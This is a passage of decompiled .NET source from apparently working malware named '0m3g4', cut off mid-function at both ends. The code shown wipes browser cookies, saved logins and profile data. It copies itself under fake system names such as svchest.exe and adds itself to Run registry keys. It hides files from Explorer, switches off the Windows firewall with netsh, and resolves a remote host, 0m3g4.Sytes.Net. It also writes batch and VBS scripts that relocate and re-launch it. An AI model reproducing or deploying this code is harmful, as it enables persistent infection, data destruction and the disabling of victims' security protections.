                if (file.Contains("cookie"))
                {
                  try
                  {
                    MyProject.Computer.FileSystem.DeleteFile(file);
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    ProjectData.ClearProjectError();
                  }
                }
              }
            }
            finally
            {
              IEnumerator<string> enumerator;
              enumerator?.Dispose();
            }
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
    }

    public void DeleteMozillaCache(bool Enable)
    {
      if (!Enable)
        return;
      string str = MyProject.Computer.FileSystem.SpecialDirectories.Temp.Remove(MyProject.Computer.FileSystem.SpecialDirectories.Temp.LastIndexOf("\\"));
      if (Directory.Exists(str))
      {
        try
        {
          foreach (string directory in MyProject.Computer.FileSystem.GetDirectories(str))
          {
            try
            {
              foreach (string file in MyProject.Computer.FileSystem.GetFiles(directory))
              {
                try
                {
                  MyProject.Computer.FileSystem.DeleteFile(file);
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                }
              }
            }
            finally
            {
              IEnumerator<string> enumerator;
              enumerator?.Dispose();
            }
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
    }

    public void DeleteMozillaSignons(bool Enable)
    {
      if (!Enable)
        return;
      string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
      if (Directory.Exists(str))
      {
        try
        {
          foreach (string directory in MyProject.Computer.FileSystem.GetDirectories(str))
          {
            try
            {
              foreach (string file in MyProject.Computer.FileSystem.GetFiles(directory))
              {
                if (file.Contains("signon"))
                {
                  try
                  {
                    MyProject.Computer.FileSystem.DeleteFile(file);
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    ProjectData.ClearProjectError();
                  }
                }
              }
            }
            finally
            {
              IEnumerator<string> enumerator;
              enumerator?.Dispose();
            }
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
    }

    public void DeleteMozillaSqlite(bool Enable)
    {
      if (!Enable)
        return;
      string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
      if (Directory.Exists(str))
      {
        try
        {
          foreach (string directory in MyProject.Computer.FileSystem.GetDirectories(str))
          {
            try
            {
              foreach (string file in MyProject.Computer.FileSystem.GetFiles(directory))
              {
                if (file.Contains("sqlite"))
                {
                  try
                  {
                    MyProject.Computer.FileSystem.DeleteFile(file);
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    ProjectData.ClearProjectError();
                  }
                }
              }
            }
            finally
            {
              IEnumerator<string> enumerator;
              enumerator?.Dispose();
            }
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
    }

    public void DeleteGoogleChromeData(bool Enable)
    {
      if (!Enable)
        return;
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
      if (Directory.Exists(folderPath + "\\Google\\Chrome\\User Data"))
      {
        try
        {
          foreach (string file in MyProject.Computer.FileSystem.GetFiles(folderPath + "\\Google\\Chrome\\User Data"))
          {
            try
            {
              MyProject.Computer.FileSystem.DeleteFile(file);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
        try
        {
          foreach (string directory in MyProject.Computer.FileSystem.GetDirectories(folderPath + "\\Google\\Chrome\\User Data"))
          {
            try
            {
              MyProject.Computer.FileSystem.DeleteDirectory(directory, DeleteDirectoryOption.DeleteAllContents);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
    }

    public void DeleteFlashPlayerCookies(bool Enable)
    {
      if (!Enable)
        return;
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
      if (Directory.Exists(folderPath + "\\Macromedia"))
      {
        try
        {
          foreach (string directory in MyProject.Computer.FileSystem.GetDirectories(folderPath + "\\Macromedia"))
          {
            try
            {
              MyProject.Computer.FileSystem.DeleteDirectory(directory, DeleteDirectoryOption.DeleteAllContents);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
    }

    public void DeleteOperaUserData(bool Enable)
    {
      if (!Enable)
        return;
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
      if (Directory.Exists(folderPath + "\\Opera"))
      {
        try
        {
          foreach (string directory in MyProject.Computer.FileSystem.GetDirectories(folderPath + "\\Opera"))
          {
            try
            {
              MyProject.Computer.FileSystem.DeleteDirectory(directory, DeleteDirectoryOption.DeleteAllContents);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
    }

    public void DeleteSafariUserData(bool Enable)
    {
      if (!Enable)
        return;
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
      if (Directory.Exists(folderPath + "\\Apple Computer\\Safari"))
      {
        try
        {
          foreach (string file in MyProject.Computer.FileSystem.GetFiles(folderPath + "\\Apple Computer\\Safari"))
          {
            try
            {
              MyProject.Computer.FileSystem.DeleteFile(file);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
        try
        {
          foreach (string directory in MyProject.Computer.FileSystem.GetDirectories(folderPath + "\\Apple Computer\\Safari"))
          {
            try
            {
              MyProject.Computer.FileSystem.DeleteDirectory(directory, DeleteDirectoryOption.DeleteAllContents);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
    }

    public void Clear_All(bool Enable)
    {
      if (!Enable)
        return;
      try
      {
        Process process = new Process();
        string str = "RunDll32.exe";
        process.StartInfo.Arguments = "InetCpl.cpl,ClearMyTracksByProcess 4351";
        process.StartInfo.FileName = str;
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        process.StartInfo.CreateNoWindow = true;
        process.Start();
        process.WaitForExit();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        Process process = new Process();
        string str = "netsh.exe";
        process.StartInfo.Arguments = "interface ip delete arpcache";
        process.StartInfo.FileName = str;
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        process.StartInfo.CreateNoWindow = true;
        process.Start();
        process.WaitForExit();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        Process process = new Process();
        string str = "ipconfig.exe";
        process.StartInfo.Arguments = "/flushdns";
        process.StartInfo.FileName = str;
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        process.StartInfo.CreateNoWindow = true;
        process.Start();
        process.WaitForExit();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void AddToStartup()
    {
label_1:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_2:
        int num3 = 2;
        if (!MyProject.Computer.Info.OSFullName.ToString().Contains("XP"))
          goto label_5;
label_3:
        num3 = 3;
        string str1 = this.FilesFolder + "\\lsess.exe";
label_4:
        num3 = 4;
        string str2 = Environment.SystemDirectory + "\\svchest.exe";
        goto label_10;
label_5:
        num3 = 6;
        if (!MyProject.Computer.Info.OSFullName.ToString().Contains("Vista"))
          goto label_7;
label_6:
        num3 = 7;
        str1 = this.FilesFolder + "\\lsess.exe";
        goto label_10;
label_7:
        num3 = 9;
        if (!MyProject.Computer.Info.OSFullName.ToString().Contains("7"))
          goto label_10;
label_8:
        num3 = 10;
        str1 = this.FilesFolder + "\\lsess.exe";
label_9:
        num3 = 11;
        str2 = this.RootFolder + "ProgramData\\Microsoft\\DeviceSync\\svchest.exe";
label_10:
label_11:
        num3 = 13;
        if (!MyProject.Computer.FileSystem.FileExists(this.StartupFolder + "\\lsess.exe"))
          goto label_13;
label_12:
        num3 = 14;
        System.IO.File.Delete(this.StartupFolder + "\\lsess.exe");
label_13:
        num3 = 16;
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, this.StartupFolder + "\\lsess.exe", true);
label_14:
        num3 = 17;
        Microsoft.VisualBasic.FileSystem.SetAttr(this.StartupFolder + "\\lsess.exe", FileAttribute.Hidden);
label_15:
        num3 = 18;
        MyProject.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("svcfile", (object) str2);
label_16:
        num3 = 19;
        MyProject.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("sysfile", (object) str1);
label_17:
        num3 = 20;
        MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", (object) "1", RegistryValueKind.DWord);
label_18:
        num3 = 21;
        MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "ShowSuperHidden", (object) "0", RegistryValueKind.DWord);
label_19:
        num3 = 22;
        MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "SuperHidden", (object) "0", RegistryValueKind.DWord);
label_20:
        num3 = 23;
        MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object) "2", RegistryValueKind.DWord);
        goto label_27;
label_22:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
              case 8:
              case 12:
                goto label_10;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 9:
                goto label_7;
              case 10:
                goto label_8;
              case 11:
                goto label_9;
              case 13:
                goto label_11;
              case 14:
                goto label_12;
              case 15:
              case 16:
                goto label_13;
              case 17:
                goto label_14;
              case 18:
                goto label_15;
              case 19:
                goto label_16;
              case 20:
                goto label_17;
              case 21:
                goto label_18;
              case 22:
                goto label_19;
              case 23:
                goto label_20;
              case 24:
                goto label_27;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_22;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_27:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private bool chkExistence()
    {
      if (Operators.CompareString((string) Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Om3g4", "Om3g4D", (object) ""), "Om3g4D", false) == 0)
        return true;
      RegistryKey subKey = Registry.CurrentUser.OpenSubKey("Software", true).CreateSubKey("Om3g4");
      subKey.SetValue("Om3g4D", (object) "Om3g4D");
      subKey.SetValue("CurrentVersion", (object) this.MyVer);
      return false;
    }

    private void chkInternet()
    {
      this.NetworkConnectivity = !MyProject.Computer.Network.Ping(this.pingsite) ? Conversions.ToString(false) : Conversions.ToString(true);
      try
      {
        if (Conversions.ToBoolean(this.NetworkConnectivity))
        {
          if (Operators.CompareString(this.MyExtIP, (string) null, false) == 0)
            this.MyExtIP = Encoding.ASCII.GetString(this.WC.DownloadData("http://whatismyip.org"));
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        if (Conversions.ToBoolean(this.NetworkConnectivity))
        {
          if (Operators.CompareString(this.MyExtIP, (string) null, false) == 0 | this.MyExtIP.Contains("://"))
            this.MyExtIP = Encoding.ASCII.GetString(this.WC.DownloadData("http://automation.whatismyip.com/n09230945.asp"));
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        if (Conversions.ToBoolean(this.NetworkConnectivity))
        {
          if (Operators.CompareString(this.MyExtIP, (string) null, false) == 0 | this.MyExtIP.Contains("://"))
            this.MyExtIP = Encoding.ASCII.GetString(this.WC.DownloadData("http://icanhazip.com"));
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        if (Conversions.ToBoolean(this.NetworkConnectivity))
        {
          if (Operators.CompareString(this.MyExtIP, (string) null, false) == 0 | this.MyExtIP.Contains("://"))
            this.MyExtIP = Encoding.ASCII.GetString(this.WC.DownloadData("http://myip.dnsomatic.com"));
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      if (!Conversions.ToBoolean(this.NetworkConnectivity))
        this.RemoteNotifier = this.InternalNotifier;
      if (Conversions.ToBoolean(this.NetworkConnectivity))
        this.RemoteNotifier = this.ExternalNotifier;
      if (!Conversions.ToBoolean(this.NetworkConnectivity))
        this.IP = this.MyIntIP;
      if (Conversions.ToBoolean(this.NetworkConnectivity))
        this.IP = this.MyExtIP;
      if (Conversions.ToBoolean(this.NetworkConnectivity))
        this.Dns2IP("0m3g4.Sytes.Net");
      if (!System.IO.File.Exists(this.TempFolder + "\\nonet.txt") || !MyProject.Computer.FileSystem.ReadAllText(this.TempFolder + "\\nonet.txt").Contains("Email"))
        return;
      this.FirstTimeNotify();
    }

    private void Dns2IP(string Site)
    {
      try
      {
        this.RemoteNotifier = Convert.ToString((object) Dns.GetHostEntry(Site).AddressList[0]);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Leave_Home()
    {
label_1:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_2:
        int num3 = 2;
        Process process1 = new Process();
label_3:
        num3 = 3;
        string str1 = "netsh.exe";
label_4:
        num3 = 4;
        if (!MyProject.Computer.Info.OSFullName.ToString().Contains("XP"))
          goto label_6;
label_5:
        num3 = 5;
        process1.StartInfo.Arguments = "firewall set opmode disable";
        goto label_8;
label_6:
        num3 = 7;
        if (!(MyProject.Computer.Info.OSFullName.ToString().Contains("Vista") | MyProject.Computer.Info.OSFullName.ToString().Contains("7")))
          goto label_8;
label_7:
        num3 = 8;
        process1.StartInfo.Arguments = "advfirewall set allprofiles state off";
label_8:
label_9:
        num3 = 10;
        process1.StartInfo.FileName = str1;
label_10:
        num3 = 11;
        process1.StartInfo.UseShellExecute = false;
label_11:
        num3 = 12;
        process1.StartInfo.RedirectStandardOutput = true;
label_12:
        num3 = 13;
        process1.StartInfo.CreateNoWindow = true;
label_13:
        num3 = 14;
        process1.Start();
label_14:
        num3 = 15;
        process1.WaitForExit();
label_15:
        num3 = 16;
        if (Operators.CompareString(Application.StartupPath, this.FilesFolder, false) == 0 | Operators.CompareString(Application.StartupPath, Environment.SystemDirectory, false) == 0 | Operators.CompareString(Application.StartupPath, this.RootFolder + "ProgramData\\Microsoft\\DeviceSync", false) == 0)
          goto label_114;
label_16:
        num3 = 19;
        if (Directory.Exists(this.BaseFolder))
          goto label_19;
label_17:
        num3 = 20;
        Directory.CreateDirectory(this.BaseFolder);
label_18:
        num3 = 21;
        Microsoft.VisualBasic.FileSystem.SetAttr(this.BaseFolder, FileAttribute.Hidden);
label_19:
label_20:
        num3 = 23;
        if (Directory.Exists(this.ServerExchangeFolder))
          goto label_22;
label_21:
        num3 = 24;
        Directory.CreateDirectory(this.ServerExchangeFolder);
label_22:
label_23:
        num3 = 26;
        if (Directory.Exists(this.ToolsFolder))
          goto label_25;
label_24:
        num3 = 27;
        Directory.CreateDirectory(this.ToolsFolder);
label_25:
label_26:
        num3 = 29;
        if (Directory.Exists(this.TempFolder))
          goto label_28;
label_27:
        num3 = 30;
        Directory.CreateDirectory(this.TempFolder);
label_28:
label_29:
        num3 = 32;
        if (Directory.Exists(this.FilesFolder))
          goto label_31;
label_30:
        num3 = 33;
        Directory.CreateDirectory(this.FilesFolder);
label_31:
label_32:
        num3 = 35;
        if (Directory.Exists(this.PersistentFolder))
          goto label_34;
label_33:
        num3 = 36;
        Directory.CreateDirectory(this.PersistentFolder);
label_34:
label_35:
        num3 = 38;
        if (!MyProject.Computer.Info.OSFullName.ToString().Contains("XP"))
          goto label_38;
label_36:
        num3 = 39;
        string str2 = this.FilesFolder + "\\lsess.exe";
label_37:
        num3 = 40;
        string str3 = Environment.SystemDirectory + "\\svchest.exe";
        goto label_43;
label_38:
        num3 = 42;
        if (!MyProject.Computer.Info.OSFullName.ToString().Contains("Vista"))
          goto label_40;
label_39:
        num3 = 43;
        str2 = this.FilesFolder + "\\lsess.exe";
        goto label_43;
label_40:
        num3 = 45;
        if (!MyProject.Computer.Info.OSFullName.ToString().Contains("7"))
          goto label_43;
label_41:
        num3 = 46;
        str2 = this.FilesFolder + "\\lsess.exe";
label_42:
        num3 = 47;
        str3 = this.RootFolder + "ProgramData\\Microsoft\\DeviceSync\\svchest.exe";
label_43:
label_44:
        num3 = 49;
        DriveInfo[] drives = DriveInfo.GetDrives();
label_45:
        num3 = 50;
        DriveInfo[] driveInfoArray = drives;
        int index = 0;
        goto label_97;
label_47:
        num3 = 51;
        DriveInfo driveInfo;
        if ((int) driveInfo.RootDirectory.Root.ToString()[0] != (int) Environment.CurrentDirectory[0])
          goto label_95;
label_48:
        num3 = 52;
        if (driveInfo.DriveType != DriveType.Removable)
          goto label_70;
label_49:
        num3 = 53;
        FileStream fileStream1 = new FileStream(this.TempFolder + "\\Relocate.bat", FileMode.Create, FileAccess.Write);
label_50:
        num3 = 54;
        StreamWriter streamWriter1 = new StreamWriter((Stream) fileStream1);
label_51:
        num3 = 55;
        streamWriter1.BaseStream.Seek(0L, SeekOrigin.End);
label_52:
        num3 = 56;
        streamWriter1.WriteLine("tskill lsess");
label_53:
        num3 = 57;
        streamWriter1.WriteLine("tskill svchest");
label_54:
        num3 = 58;
        streamWriter1.WriteLine("tskill UpdateAccess");
label_55:
        num3 = 59;
        streamWriter1.WriteLine("tskill updateaccess");
label_56:
        num3 = 60;
        streamWriter1.WriteLine("tskill *Resume*");
label_57:
        num3 = 61;
        streamWriter1.WriteLine("tskill *Birth*");
label_58:
        num3 = 62;
        streamWriter1.WriteLine("tskill *TaxRecord*");
label_59:
        num3 = 63;
        streamWriter1.WriteLine("tskill *Medical*");
label_60:
        num3 = 64;
        streamWriter1.WriteLine("tskill *Angelina*");
label_61:
        num3 = 65;
        streamWriter1.WriteLine("tskill *0m3g4*");
label_62:
        num3 = 66;
        streamWriter1.WriteLine("ping 127.0.0.1 -n 3 > %tmp%\\nul");
label_63:
        num3 = 67;
        streamWriter1.WriteLine("copy \"" + Application.ExecutablePath + "\" \"" + str3 + "\"");
label_64:
        num3 = 68;
        streamWriter1.WriteLine("ping 127.0.0.1 -n 3 > %tmp%\\nul");
label_65:
        num3 = 69;
        streamWriter1.WriteLine("copy \"" + Application.ExecutablePath + "\" \"" + str2 + "\"");
label_66:
        num3 = 70;
        streamWriter1.WriteLine("ping 127.0.0.1 -n 3 > %tmp%\\nul");
label_67:
        num3 = 71;
        streamWriter1.WriteLine("start " + str2);
label_68:
        num3 = 72;
        streamWriter1.WriteLine("del %0");
label_69:
        num3 = 73;
        streamWriter1.Close();
        goto label_94;
label_70:
        num3 = 75;
label_71:
        num3 = 76;
        FileStream fileStream2 = new FileStream(this.TempFolder + "\\Relocate.bat", FileMode.Create, FileAccess.Write);
label_72:
        num3 = 77;
        StreamWriter streamWriter2 = new StreamWriter((Stream) fileStream2);
label_73:
        num3 = 78;
        streamWriter2.BaseStream.Seek(0L, SeekOrigin.End);
label_74:
        num3 = 79;
        streamWriter2.WriteLine("tskill lsess");
label_75:
        num3 = 80;
        streamWriter2.WriteLine("tskill svchest");
label_76:
        num3 = 81;
        streamWriter2.WriteLine("tskill UpdateAccess");
label_77:
        num3 = 82;
        streamWriter2.WriteLine("tskill updateaccess");
label_78:
        num3 = 83;
        streamWriter2.WriteLine("tskill *Resume*");
label_79:
        num3 = 84;
        streamWriter2.WriteLine("tskill *Birth*");
label_80:
        num3 = 85;
        streamWriter2.WriteLine("tskill *TaxRecord*");
label_81:
        num3 = 86;
        streamWriter2.WriteLine("tskill *Medical*");
label_82:
        num3 = 87;
        streamWriter2.WriteLine("tskill *Angelina*");
label_83:
        num3 = 88;
        streamWriter2.WriteLine("tskill *0m3g4*");
label_84:
        num3 = 89;
        streamWriter2.WriteLine("ping 127.0.0.1 -n 3 > %tmp%\\nul");
label_85:
        num3 = 90;
        streamWriter2.WriteLine("copy \"" + Application.ExecutablePath + "\" \"" + str3 + "\"");
label_86:
        num3 = 91;
        streamWriter2.WriteLine("ping 127.0.0.1 -n 3 > %tmp%\\nul");
label_87:
        num3 = 92;
        streamWriter2.WriteLine("copy \"" + Application.ExecutablePath + "\" \"" + str2 + "\"");
label_88:
        num3 = 93;
        streamWriter2.WriteLine("ping 127.0.0.1 -n 3 > %tmp%\\nul");
label_89:
        num3 = 94;
        streamWriter2.WriteLine("del \"" + Application.ExecutablePath + "\"");
label_90:
        num3 = 95;
        streamWriter2.WriteLine("ping 127.0.0.1 -n 3 > %tmp%\\nul");
label_91:
        num3 = 96;
        streamWriter2.WriteLine("start " + str2);
label_92:
        num3 = 97;
        streamWriter2.WriteLine("del %0");
label_93:
        num3 = 98;
        streamWriter2.Close();
label_94:
label_95:
        checked { ++index; }
label_96:
        num3 = 101;
label_97:
        if (index < driveInfoArray.Length)
        {
          driveInfo = driveInfoArray[index];
          goto label_47;
        }
label_98:
        num3 = 102;
        Process process2 = new Process();
label_99:
        num3 = 103;
        string fileName = this.TempFolder + "\\Relocate.bat";
label_100:
        num3 = 104;
        process2.StartInfo.FileName = fileName;
label_101:
        num3 = 105;
        process2.StartInfo.UseShellExecute = false;
label_102:
        num3 = 106;
        process2.StartInfo.CreateNoWindow = true;
label_103:
        num3 = 107;
        process2.Start();
label_104:
        num3 = 108;
        process2.WaitForExit();
label_105:
        num3 = 109;
        FileInfo fileInfo = new FileInfo(fileName);
label_106:
        num3 = 110;
        fileInfo.Delete();
label_107:
        num3 = 111;
        Application.Exit();
        goto label_114;
label_109:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_5;
              case 6:
              case 9:
                goto label_8;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
                goto label_12;
              case 14:
                goto label_13;
              case 15:
                goto label_14;
              case 16:
                goto label_15;
              case 17:
              case 112:
                goto label_114;
              case 18:
              case 19:
                goto label_16;
              case 20:
                goto label_17;
              case 21:
                goto label_18;
              case 22:
                goto label_19;
              case 23:
                goto label_20;
              case 24:
                goto label_21;
              case 25:
                goto label_22;
              case 26:
                goto label_23;
              case 27:
                goto label_24;
              case 28:
                goto label_25;
              case 29:
                goto label_26;
              case 30:
                goto label_27;
              case 31:
                goto label_28;
              case 32:
                goto label_29;
              case 33:
                goto label_30;
              case 34:
                goto label_31;
              case 35:
                goto label_32;
              case 36:
                goto label_33;
              case 37:
                goto label_34;
              case 38:
                goto label_35;
              case 39:
                goto label_36;
              case 40:
                goto label_37;
              case 41:
              case 44:
              case 48:
                goto label_43;
              case 42:
                goto label_38;
              case 43:
                goto label_39;
              case 45:
                goto label_40;
              case 46:
                goto label_41;
              case 47:
                goto label_42;
              case 49:
                goto label_44;
              case 50:
                goto label_45;
              case 51:
                goto label_47;
              case 52:
                goto label_48;
              case 53:
                goto label_49;
              case 54:
                goto label_50;
              case 55:
                goto label_51;
              case 56:
                goto label_52;
              case 57:
                goto label_53;
              case 58:
                goto label_54;
              case 59:
                goto label_55;
              case 60:
                goto label_56;
              case 61:
                goto label_57;
              case 62:
                goto label_58;
              case 63:
                goto label_59;
              case 64:
                goto label_60;
              case 65:
                goto label_61;
              case 66:
                goto label_62;
              case 67:
                goto label_63;
              case 68:
                goto label_64;
              case 69:
                goto label_65;
              case 70:
                goto label_66;
              case 71:
                goto label_67;
              case 72:
                goto label_68;
              case 73:
                goto label_69;
              case 74:
              case 99:
                goto label_94;
              case 75:
                goto label_70;
              case 76:
                goto label_71;
              case 77:
                goto label_72;
              case 78:
                goto label_73;
              case 79:
                goto label_74;
              case 80:
                goto label_75;
              case 81:
                goto label_76;
              case 82:
                goto label_77;
              case 83:
                goto label_78;
              case 84:
                goto label_79;
              case 85:
                goto label_80;
              case 86:
                goto label_81;
              case 87:
                goto label_82;
              case 88:
                goto label_83;
              case 89:
                goto label_84;
              case 90:
                goto label_85;
              case 91:
                goto label_86;
              case 92:
                goto label_87;
              case 93:
                goto label_88;
              case 94:
                goto label_89;
              case 95:
                goto label_90;
              case 96:
                goto label_91;
              case 97:
                goto label_92;
              case 98:
                goto label_93;
              case 100:
                goto label_95;
              case 101:
                goto label_96;
              case 102:
                goto label_98;
              case 103:
                goto label_99;
              case 104:
                goto label_100;
              case 105:
                goto label_101;
              case 106:
                goto label_102;
              case 107:
                goto label_103;
              case 108:
                goto label_104;
              case 109:
                goto label_105;
              case 110:
                goto label_106;
              case 111:
                goto label_107;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_109;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_114:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void Resisitation()
    {
label_1:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_2:
        int num3 = 2;
        string str1 = Conversions.ToString(DateAndTime.Now.TimeOfDay.TotalMilliseconds);
label_3:
        num3 = 3;
        if (!MyProject.Computer.Info.OSFullName.ToString().Contains("XP"))
          goto label_6;
label_4:
        num3 = 4;
        string str2 = this.FilesFolder + "\\lsess.exe";
label_5:
        num3 = 5;
        string str3 = Environment.SystemDirectory + "\\svchest.exe";
        goto label_11;
label_6:
        num3 = 7;
        if (!MyProject.Computer.Info.OSFullName.ToString().Contains("Vista"))
          goto label_8;
label_7:
        num3 = 8;
        str2 = this.FilesFolder + "\\lsess.exe";
        goto label_11;
label_8:
        num3 = 10;
        if (!MyProject.Computer.Info.OSFullName.ToString().Contains("7"))
          goto label_11;
label_9:
        num3 = 11;
        str2 = this.FilesFolder + "\\lsess.exe";
label_10:
        num3 = 12;
        str3 = this.RootFolder + "ProgramData\\Microsoft\\DeviceSync\\svchest.exe";
label_11:
label_12:
        num3 = 14;
        FileStream fileStream1 = new FileStream(this.TempFolder + "\\0m3g4-" + str1 + ".txt", FileMode.Create, FileAccess.Write);
label_13:
        num3 = 15;
        StreamWriter streamWriter1 = new StreamWriter((Stream) fileStream1);
label_14:
        num3 = 16;
        streamWriter1.BaseStream.Seek(0L, SeekOrigin.End);
label_15:
        num3 = 17;
        streamWriter1.WriteLine("On Error Resume Next");
label_16:
        num3 = 18;
        streamWriter1.WriteLine("state = 1");
label_17:
        num3 = 19;
        streamWriter1.WriteLine("While state = 1");
label_18:
        num3 = 20;
        streamWriter1.WriteLine("Dim WshShell");
label_19:
        num3 = 21;
        streamWriter1.WriteLine("Set WshShell = WScript.CreateObject (\"WScript.Shell\")");
label_20:
        num3 = 22;
        streamWriter1.WriteLine("Set colProcessList = GetObject(\"Winmgmts:\").ExecQuery (\"Select * from Win32_Process\")");
label_21:
        num3 = 23;
        streamWriter1.WriteLine("For Each objProcess in colProcessList");
label_22:
        num3 = 24;
        streamWriter1.WriteLine("if objProcess.name = \"lsess.exe\" OR objProcess.name = \"svchest.exe\" then");
label_23:
        num3 = 25;
        streamWriter1.WriteLine("vFound = True");
label_24:
        num3 = 26;
        streamWriter1.WriteLine("End if");
label_25:
        num3 = 27;
        streamWriter1.WriteLine("Next");
label_26:
        num3 = 28;
        streamWriter1.WriteLine("If vFound = True then");
label_27:
        num3 = 29;
        streamWriter1.WriteLine("wscript.sleep 60000");
label_28:
        num3 = 30;
        streamWriter1.WriteLine("Else");
label_29:
        num3 = 31;
        streamWriter1.WriteLine("WshShell.run (\"cscript " + this.PersistentFolder + "\\0m3g4-hidden.vbs " + this.PersistentFolder + "\\0m3g4-" + str1 + ".bat\")");
label_30:
        num3 = 32;
        streamWriter1.WriteLine("wscript.sleep 30000");
label_31:
        num3 = 33;
        streamWriter1.WriteLine("End If");
label_32:
        num3 = 34;
        streamWriter1.WriteLine("vFound = False");
label_33:
        num3 = 35;
        streamWriter1.WriteLine("Wend");
label_34:
        num3 = 36;
        streamWriter1.Close();
label_35:
        num3 = 37;
        FileStream fileStream2 = new FileStream(this.TempFolder + "\\0m3g4-" + str1 + ".vbs", FileMode.Create, FileAccess.Write);
label_36:
        num3 = 38;
